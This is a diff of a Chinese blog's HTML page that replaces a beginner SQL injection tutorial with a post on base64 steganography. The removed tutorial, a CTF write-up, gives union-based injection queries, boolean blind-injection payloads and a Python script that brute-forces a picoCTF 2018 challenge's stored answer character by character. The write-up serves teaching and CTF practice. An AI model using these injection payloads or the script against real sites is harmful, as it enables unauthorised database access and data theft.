@@ -22,7 +22,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.38.1 with theme Tranquilpeak 0.4.3-BETA">
-    <title>Basic Sql Injection 1</title>
+    <title>Base64隐写</title>
     <meta name="author" content="CLtheorem">
     <meta name="keywords" content="">
 
@@ -30,17 +30,17 @@
     
 
     
-    <meta name="description" content="基础的MySQL(MariaDB)数据库注入知识（一）
+    <meta name="description" content="你真的理解base64吗。
     ">
-    <meta property="og:description" content="基础的MySQL(MariaDB)数据库注入知识（一）
+    <meta property="og:description" content="你真的理解base64吗。
     ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Basic Sql Injection 1">
-    <meta property="og:url" content="/2018/04/basic-sql-injection-1/">
+    <meta property="og:title" content="Base64隐写">
+    <meta property="og:url" content="/2018/10/base64%E9%9A%90%E5%86%99/">
     <meta property="og:site_name" content="CLtheorem">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="CLtheorem">
-    <meta name="twitter:description" content="基础的MySQL(MariaDB)数据库注入知识（一）
+    <meta name="twitter:description" content="你真的理解base64吗。
     ">
     
     
@@ -188,23 +188,23 @@
 
       <div id="main" data-behavior="4"
         class="
-               hasCoverMetaOut
+               hasCoverMetaIn
                ">
         <article class="post" itemscope itemType="http://schema.org/BlogPosting">
           
           
-            <div class="post-header main-content-wrap text-center">
+            <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      Basic Sql Injection 1
+      Base64隐写
     </h1>
   
   
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2018-04-25T13:58:41&#43;08:00">
+      <time itemprop="datePublished" datetime="2018-10-22T22:36:01&#43;08:00">
         
-  四月 25, 2018
+  十月 22, 2018
 
       </time>
     
@@ -213,7 +213,7 @@
   
     <span>发布在</span>
     
-      <a class="category-link" href="/categories/web">Web</a>
+      <a class="category-link" href="/categories/misc">MISC</a>
     
   
 
@@ -223,215 +223,208 @@
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>基础的MySQL(MariaDB)数据库注入知识（一）
+              <p>你真的理解base64吗。
     </p>
 
-<p>0x00 基础知识</p>
+<p>0x00 base64编解码原理</p>
 
-<pre><code>(1)information_schema
-    information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。简单点说，这台MySQL服务器
-    上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访
-    问，等等信息都保存在information_schema里面。
-    information_schema的表schemata中的列schema_name记录了所有数据库的名字
-    information_schema的表tables中的列table_schema记录了所有数据库的名字
-    information_schema的表tables中的列table_name记录了所有数据库的表的名字
-    information_schema的表columns中的列table_schema记录了所有数据库的名字
-    information_schema的表columns中的列table_name记录了所有数据库的表的名字
-    information_schema的表columns中的列column_name记录了所有数据库的表的列的名字
-(2)注释
-    单行注释符：#、-- (注意--之后有个空格)
-    块注释：/**/
-(3)order by
-    以指定字段作为排序条件，返回排序后的查询结果。
-    指定的字段可以是具体的字段名，如：
-    MariaDB [dblab]&gt; select * from user_action order by item_category limit 3;
-    +--------+-----------+-----------+---------------+---------------+------------+-----------+
-    | id     | uid       | item_id   | behavior_type | item_category | visit_date | province  |
-    +--------+-----------+-----------+---------------+---------------+------------+-----------+
-    | 55999  | 100895125 | 80944087  | 1             | 10010         | 2014-11-19 | 重庆市    |
-    | 56072  | 100895125 | 80944087  | 1             | 10010         | 2014-11-19 | 吉林      |
-    | 242954 | 103193989 | 183901987 | 1             | 10012         | 2014-12-08 | 天津市    |
-    +--------+-----------+-----------+---------------+---------------+------------+-----------+
-    也可以是数字，如：
-    MariaDB [dblab]&gt; select * from user_action order by 5 limit 3;
-    表示按第5个字段进行排序，和上面效果一样。
-    当输入的数字大于表的总字段数时，就会产生错误，基于此，注入时便可借助order by加数字，通过二分法快速确定
-    表中有多少列。
-(4)group_concat()
-    把指定字段的全部内容统计在一行中作为一个单元输出，如下例子，获取security库中所有表和表中字段:
-    MariaDB [dblab]&gt; select table_name,group_concat(column_name) from information_schema.columns where table_schema='security' group by table_name;
-    +------------+-------------------------------+
-    | table_name | group_concat(column_name)     |
-    +------------+-------------------------------+
-    | emails     | id,email_id                   |
-    | referers   | id,referer,ip_address         |
-    | uagents    | id,uagent,ip_address,username |
-    | users      | id,username,password          |
-    +------------+-------------------------------+
+<pre><code>    Base64是一种基于64个可打印字符来表示二进制数据的表示方法，将不可见字符可视化是其一大特点。64个可打印
+字符依次为A-Za-z0-9+/，可用6bit二进制数映射这64个字符，对应编码见下表
 </code></pre>
 
-<p>例题： <a href="http://ctf5.shiyanbar.com/8/index.php?id=1">http://ctf5.shiyanbar.com/8/index.php?id=1</a></p>
+<p><div align="center">
+<img src="/post/images/base64_2.jpg" alt="table1" />
+<div align="left"></p>
 
-<pre><code>    这是个没有过滤的布尔注入，很基础，适合用来理解上面的知识点。
-    先联合查询获取库名：
-    id = -1 union select 1,database()
+<pre><code>编码示例
 </code></pre>
 
-<p><img src="/post/images/01.jpg" alt="image1" /></p>
+<p><img src="/post/images/base64_1.jpg" alt="table2" /></p>
 
-<pre><code>    之后借助information_schema获取库中的表名和字段名：
-    id=-1 union select table_name,group_concat(column_name) from information_schema.columns where table_schema=‘my_db’ group by table_name
-    其中information_schema.columns表示从当前库夸库到information_schema库查询其columns表
+<pre><code>    可见编码过程就是将文本字符对应成二进制后，再六个一组对应成索引，转为编码字符。如果字符串长度不是3的
+倍数，则对应的二进制位数不是6的倍数，需要在末尾用0填充。若剩1个字符则在编码结果后加2个‘=’；若剩2个字符则
+加1个‘=’。如下示例
 </code></pre>
 
-<p><img src="/post/images/02.jpg" alt="image2" /></p>
+<p><img src="/post/images/base64_3.jpg" alt="table3" /></p>
 
-<pre><code>    这样就得到了当前数据库的表和其中字段的信息
-    看名字，flag很有可能就在k0y字段，实际也确实如此。
-    id =-1 union select 1,k0y from thiskey 
-    即可得到flag
-(5)字符串截取函数：
-    left(), right(), substring(), substring_index()；还有mid(), substr()，在MySQL中这两个等价于substring()函数。
-    用法：substring(string,start,[length]) 如截取库名的前三个字符:
-    MariaDB [dblab]&gt; select substring(database(),1,3);
-    +---------------------------+
-    | substring(database(),1,3) |
-    +---------------------------+
-    | dbl                       |
-    +---------------------------+
-    用法：left(string, length), right(string. length) 分别是从左端截取和从右端截取
-    也可以用 select substring(database() from 1 for 3); 替代上述查询语句。
-(6)length()
-    获取字符串长度
-    MariaDB [dblab]&gt; select length(database());
-    +--------------------+
-    | length(database()) |
-    +--------------------+
-    |                  5 |
-    +--------------------+
-(7)if()函数
-    语法: if(condition，true_expr, false_expr) 如果条件式condition为真，则返回true_expr，反之false_expr
-    MariaDB [dblab]&gt; select if(mid(database(),1,2)='db', 1, 0);
-    +------------------------------------+
-    | if(mid(database(),1,2)='db', 1, 0) |
-    +------------------------------------+
-    |                                  1 |
-    +------------------------------------+
-(8)case when
-    语法：case when condition1 then expr1 
-               when condition2 then expr2
-               ...
-               else expr 
-               end
-    从上到下，第一个条件为真的表达式作为返回值。
-
-(9)rpad()
-    语法：rpad(str, len, padstr) 用padstr对str进行右填充使字符串长度变为len，然后返回填充后的字符串，
-    若str长度大于len，则截取str前len个字符返回。
-    mysql&gt; select rpad(username,10,0) from users limit 3;
-    +---------------------+
-    | rpad(username,10,0) |
-    +---------------------+
-    | Dumb000000          |
-    | Angelina00          |
-    | Dummy00000          |
-    +---------------------+
-    与rpad()相对应的是左填充函数lpad()。
-
-(10)ascii()
-    语法:ascii(character) 返回字符的ascii码
-
-(11)char()
-    语法:char(num) 反汇ascii码对应的字符
+<pre><code>    解码过程将上面的示例从下向上看即可，即先丢弃编码后面的‘=’，然后将每个base64字符对应索引转为6bit的二
+进制数，再8个一组转为ASCII码字符完成解码，最后若剩下不足8位的，则全部丢弃。
+    所以上图紫色方框中的bit位在解码时会被丢弃，换句话说，紫色方框中的bit值不会对解码结果产生影响。一个简
+单直观的例子就是QUJDRA==和QUJDRC==解码后都是ABCD。由此我们便可以将隐藏信息插入这些bit位中实现隐写。   
 </code></pre>
 
-<p>例题：<a href="http://2018shell1.picoctf.com:36052/">http://2018shell1.picoctf.com:36052/</a></p>
+<p>0x01 base64隐写</p>
 
-<pre><code>    这是picoCTF2018中一道web题，题目名称&quot;A Simple Question&quot;，较为简单，可以通过布尔盲注的方法拿到flag
-    打开链接，看到一个简单提问，随便回答一下
+<pre><code>    可以看出一串base64的编码最多也只有4bit的隐写空间，所以实现隐写往往需要大量编码串。隐写时把明文的每个
+字符用8位二进制数表示，由此将整个明文串转为bit串，按顺序填入base64编码串的可隐写位中即可实现隐写。
 </code></pre>
 
-<p><img src="/post/images/sqlInjection1.JPG" alt="image1" />
-<img src="/post/images/sqlInjection2.JPG" alt="image1" /></p>
+<p>隐写示例</p>
 
-<pre><code>    直接返回了查询语句，尝试answer = admin' or '1
-</code></pre>
-
-<p><img src="/post/images/sqlInjection3.JPG" alt="image1" />
-<img src="/post/images/sqlInjection4.JPG" alt="image1" /></p>
-
-<pre><code>    so close? 虽然有了不同回显，但还不能据此判断注入测试成功与否，毕竟有可能是被过滤检测了。
-    检查一下网页源码，在第20行有提示
-</code></pre>
-
-<p><img src="/post/images/sqlInjection5.JPG" alt="image1" /></p>
-
-<pre><code>    遂得如下源码
-</code></pre>
-
-<p><img src="/post/images/sqlInjection6.JPG" alt="image1" /></p>
-
-<pre><code>    (通过源码可知，这题其实是SQLite数据库，虽然与MYSQL不同，但接下来注入中使用的函数在两种数据库中是相通的)
-
-    在第22行可以看出，回显“you are so close”确实是注入成功的结果。接下来根据两种不同的回显就可以进行盲
-    注了。
-    由于已经知道表名answers和字段名answer，可直接构造
-    payload1: answer = admin' or length((select group_concat(answer) from answers))&gt;1 or '0 
-    使用二分法可快速确定 length((select group_concat(answer) from answers))=14,然后就是确定具体内容
-    payload2: answer = admin' or substr((select group_concat(answer) from answers), 1, 1)&gt;char(44) or '0
-    依次增加substr()函数开始截取的位置，每次截取一个字符和char(num)进行大小比较以确定该字符的具体值，脚本如下：
+<pre><code>SSBoYXZlIGhhZCBteSBpbnZpdGF0aW9uIHRvIHRoaXMkd29ybGQncyBmZXN0aXZhbCwkYW5kIHRodXMkbXkkbGlmZSBoYXMkYmVlbiBibGVzc2VkLk==
+RWFybHkgaW4gdGhlIGRheSBpdCB3YXMgd2hpc3BlcmVkIHRoYXQgd2Ugc2hvdWxkIHNhaWwgaW4gYSBib2F0LH==
+b25seSB0aG91IGFuZCBJLG==
+YW5kIG5ldmVyIGEgc291bCBpbiB0aGUgd29ybGQgd291bGQga25vdyBvZiB0aGlzIG91ciBwaWxncmltYWdlIHRvIG5vIGNvdW50cnkgYW5kIHRvIG5vIGVuZC6=
+SW4gdGhlIG1lYW53aGlsZSBJIHNtaWxlIGFuZCBJIHNpbmcgYWxsIGFsb25lLiBJbiB0aGUgbWVhbndoaWxlIHRoZSBhaXIgaXMgZmlsbGluZyB3aXRoIHRoZSBwZXJmdW1lIG9mIHByb21pc2Uu
+VGhlIHRpbWUgdGhhdCBteSBqb3VybmV5IHRha2VzIGlzIGxvbmcgYW5kIHRoZSB3YXkgb2YgaXQgbG9uZy5=
+SSBjYW1lIG91dCBvbiB0aGUgY2hhcmlvdCBvZiB0aGUgZmlyc3QgZ2xlYW0gb2YgbGlnaHQs
+YW5kIHB1cnN1ZWQnbXkndm95YWdlIHRocm91Z2nndGhlIHdpbGRlcm5lc3NlcyBvZiB3b3JsZHMnbGVhdmluZyBteSB0cmFjayBvbiBtYW55IGEnc3RhciBhbmQncGxhbmV0Ln==
+R2l2ZSBtZSB0aGUgc3RyZW5ndGggbGlnaHRseSB0byBiZWFyIG15IGpveXMgYW5kIHNvcnJvd3Mu
+R2l2ZSBtZSB0aGUgc3RyZW5ndGggdG8gbWFrZSBteSBsb3ZlIGZydWl0ZnVsIGluIHNlcnZpY2Uu
+R2l2ZSBtZSB0aGUkc3RyZW5ndGkkbmV2ZXIkdG8kZGlzb3duIHRoZSBwb29yIG9yIGJlbmQkbXkka25lZXMkYmVmb3JlIGluc29sZW50IG1pZ2h0Lk==
+R2l2ZSBtZSB0aGUgc3RyZW5ndGggdG8gcmFpc2UgbXkgbWluZCBoaWdoIGFib3ZlIGRhaWx5IHRyaWZsZXMu
+QW5kIGdpdmUgbWUgdGhlIHN0cmVuZ3RoIHRvIHN1cnJlbmRlciBteSBzdHJlbmd0aCB0byB0aHkgd2lsbCB3aXRoIGxvdmUu
+SWYgdGhlIGRheSBpcyBkb25lLG==
+aWYgYmlyZHMgc2luZyBubyBtb3JlLB==
+aWYgdGhlIHdpbmQgaGFzIGZsYWdnZWQgdGlyZWQsIHRoZW4gZHJhdyB0aGUgdmVpbCBvZiBkYXJrbmVzcyB0aGljayB1cG9uIG1lLG==
+ZXZlbiBhcyB0aG91IGhhc3Qgd3JhcHQgdGhlIGVhcnRoIHdpdGggdGhlIGNvdmVybGV0IG9mIHNsZWVwIGFuZCB0ZW5kZXJseSBjbG9zZWQgdGhlIHBldGFscyBvZiB0aGUgZHJvb3BpbmcgbG90dXMgYXQgZHVzay7=
+RnJvbSB0aGUgdHJhdmVsbGVyLJ==
+d2hvc2Ugc2FjayBvZiBycm92aXNpb25zIGlzIGVtcHR5IGJlZm9yZSB0aGUgdm95YWdlIGlzIGVuZGVkLCB3aG9zZSBnYXJtZW50IGlzIHRvcm4gYW5kIGR1c3RsYWRlbiy=
+d2hvc2Ugc3RyZW5ndGggaXMgZXhoYXVzdGVkLK==
+cmVtb3ZlIHNoYW1lIGFuZCBwb3ZlcnR5LG==
+YW5kIHJlbmV3IGhpcyBsaWZlIGxpa2UgYSBmbG93ZXIgdW5kZXIgdGhlIGNvdmVyIG9mIHRoeSBraW5kbHkgbmlnaHQu
+V2hlbiBncmFjZSBpcyBsb3N0IGZyb20gbGlmZSwgY29tZSB3aXRoIGEgYnVyc3Qgb2Ygc29uZy4=
+SSBrbm93IHRoYXQgdGhlIGRheSB3aWxsIGNvbWUgd2hlbiBteSBzaWdodCBvZiB0aGlzIGVhcnRoIHNoYWxsIGJlIGxvc3Qs
+YW5kIGxpZmUld2lsbCB0YWtlIGl0cyBsZWF2ZSBpbiBzaWxlbmNlLCBkcmF3aW5nIHRoZSBsYXN0IGN1cnRhaW4lb3ZlciBteSBleWVzLl==
+WWV0IHN0YXJzIHdpbGwgd2F0Y2ggYXQgbmlnaHQs
+YW5kIG1vcm5pbmcgcmlzZSBhcyBiZWZvcmUs
+YW5kIGhvdXJzIGhlYXZlIGxpa2Ugc2VhIHdhdmVzIGNhc3RpbmcgdXAgcGxlYXN1cmVzIGFuZCBwYWlucy6=
+V2hlbiBJIHRoaW5rIG9mIHRoaXMgZW5kIG9mIG15IG1vbWVudHMs
+dGhlIGJhcnJpZXIgb2YgdGhlIG1vbWVudHMgYnJlYWtzIGFuZCBJIHNlZSBieSB0aGUgbGlnaHQgb2YgZGVhdGggdGh5IHdvcmxkIHdpdGggaXRzIGNhcmVsZXNzIHRyZWFzdXJlcy7=
+UmFyZSBpcyBpdHMgbG93bGllc3Qgc2VhdCw=
+cmFyZSBpcyBpdHMgbWVhbmVzdCBvZiBsaXZlcy5=
+VGhpbmdzIHRoYXQgSSBsb25nZWQgZm9yIGluIHZhaW6gYW5kIHRoaW5ncyB0aGF0IEkgZ290LS0tbGV0IHRoZW0gcGFzcy6=
+TGV0IG1lIGJ1dCB0cnVseSBwb3NzZXNzIHRoZSB0aGluZ3MgdGhhdCBJIGV2ZXIgc3B1cm5lZCBhbmQgb3Zlcmxvb2tlZC6=
+LS0tLUV4Y2VycHQgZnJvbSBUYWdvcmUgJkdpdGFuamFsaSJ=
 </code></pre>
 
 <p><br></p>
 
-<pre><code>    # python3
-    # picoCTF2018 A Simple Question
-    import requests
-
-    if __name__ == '__main__':
-        url = 'http://2018shell1.picoctf.com:36052/answer2.php'
-        # answer = &quot;admin' or length((select group_concat(answer) from answers))=14 or '0&quot;
-        for i in range(14):
-            for num in range(44, 123):
-                # 遍历ASCII码值为44~122的字符，依次与当前截取到的字符判等，来确定当前字符。
-                answer = &quot;admin' or substr((select group_concat(answer) from answers),&quot;+str(i+1)+&quot;,1)=char(&quot;+str(num)+&quot;) or '0&quot;
-                data = {
-                    'answer': answer
-                }
-                html = requests.post(url, data=data)
-                if html.text[-22:-6]=='You are so close':  
-                    print(chr(num), end='')
-                    break
+<pre><code>    上面这堆base64编码就是隐写后的结果，下面来获取隐写的内容。
+    根据隐写原理可知，1个‘=’结尾的base64编码串有2bit隐写信息，2个‘=’结尾的有4bit信息，无‘=’的没有隐写
+信息。脚本如下
 </code></pre>
 
-<p><br></p>
 
-<pre><code>    得到结果：
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight python language-python">
+  <figcaption>
+    
+      <span>decrypt.py</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-python"><code class="python">#!/usr/bin/env python
+import re
+
+path = &#39;./encodeFile.txt&#39;  
+b64char = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#43;/&#39;
+with open(path, &#39;r&#39;)as f:
+	cipher = [i.strip() for i in f.readlines()]
+plaintext = &#39;&#39;
+for i in cipher:
+	if i[-2] == &#39;=&#39;:  # There are 4-bit hidden info while end with two &#39;=&#39;
+		bin_message = bin(b64char.index(i[-3]))[2:].zfill(4)
+		plaintext &#43;= bin_message[-4:]
+	elif i[-1] == &#39;=&#39;:  # There are 2-bit hidden info while end with one &#39;=&#39;
+		bin_message = bin(b64char.index(i[-2]))[2:].zfill(2)
+		plaintext &#43;= bin_message[-2:]
+plaintext = re.findall(&#39;.{8}&#39;, plaintext)  # 8bits/group
+plaintext = &#39;&#39;.join([chr(int(i,2)) for i in plaintext])
+print plaintext</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<pre><code>得到结果：
 </code></pre>
 
-<p><img src="/post/images/sqlInjection7.JPG" alt="image1" /></p>
+<p><img src="/post/images/base64_4.jpg" alt="image1" /></p>
 
-<pre><code>    也即answer=41AndSixSixths，提交即可得到flag。
+<pre><code>隐写的内容正是这首诗歌的出处《吉檀迦利》
+
+最后附上隐写脚本
 </code></pre>
 
-<p><img src="/post/images/sqlInjection8.JPG" alt="image1" /></p>
 
-<p>Loading……</p>
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight python language-python">
+  <figcaption>
+    
+      <span>encrypt.py</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-python"><code class="python">#!/usr/bin/env python
+import base64
+
+with open(&#39;./gitanjali.txt&#39;, &#39;r&#39;)as f:
+	data = [i.strip() for i in f.readlines()]
+base64Data = [base64.b64encode(i) for i in data]
+b64char = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#43;/&#39;
+
+msg = &#39;Gitanjali&#39;  # 隐写内容，注意隐写内容不应超过最大隐写bit数
+msg_bit = &#39;&#39;.join([bin(ord(i))[2:].zfill(8) for i in msg])
+offset = 0
+new_data = []
+for i in base64Data:
+	if i[-2]==&#39;=&#39;:  # There are 4-bit hidden info while end with two &#39;=&#39;
+		offset = int(msg_bit[:4],2)
+		i = i.replace(i[-3], b64char[b64char.index(i[-3])&#43;offset])
+		msg_bit = msg_bit[4:]
+	elif i[-1]==&#39;=&#39;:  # There are 2-bit hidden info while end with one &#39;=&#39;
+		offset = int(msg_bit[:2],2)
+		i = i.replace(i[-2], b64char[b64char.index(i[-2])&#43;offset])
+		msg_bit = msg_bit[2:]
+	new_data.append(i&#43;&#34;\n&#34;)
+with open(&#39;./encodeFile.txt&#39;, &#39;w&#39;)as f:
+	f.writelines(new_data)</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<pre><code>参考链接：https://www.tr0y.wang/2017/06/14/Base64steg/index.html
+</code></pre>
               
             </div>
           </div>
           <div id="post-footer" class="post-footer main-content-wrap">
             
-              
-                
-                
-                  <div class="post-footer-tags">
-                    <span class="text-color-light text-small">标签</span><br/>
-                    
-  <a class="tag tag--primary tag--small" href="/tags/mysql/">Mysql</a>
-
-                  </div>
-                
               
             
             
@@ -441,7 +434,7 @@
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/05/gdb%E5%85%A5%E9%97%A8/" data-tooltip="Gdb入门">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
@@ -449,7 +442,7 @@
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/04/huffmancode/" data-tooltip="HuffmanCode">
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/10/pwntools/" data-tooltip="Pwntools">
               
                   <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
                   <i class="fa fa-angle-right"></i>
@@ -509,7 +502,7 @@
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/05/gdb%E5%85%A5%E9%97%A8/" data-tooltip="Gdb入门">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
@@ -517,7 +510,7 @@
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/04/huffmancode/" data-tooltip="HuffmanCode">
+                <a class="post-action-btn btn btn--default tooltip--top" href="/2018/10/pwntools/" data-tooltip="Pwntools">
               
                   <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
                   <i class="fa fa-angle-right"></i>
@@ -830,9 +823,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = '\/2018\/04\/basic-sql-injection-1\/';
+          this.page.url = '\/2018\/10\/base64%E9%9A%90%E5%86%99\/';
           
-            this.page.identifier = '\/2018\/04\/basic-sql-injection-1\/'
+            this.page.identifier = '\/2018\/10\/base64%E9%9A%90%E5%86%99\/'
           
         };
         (function() {
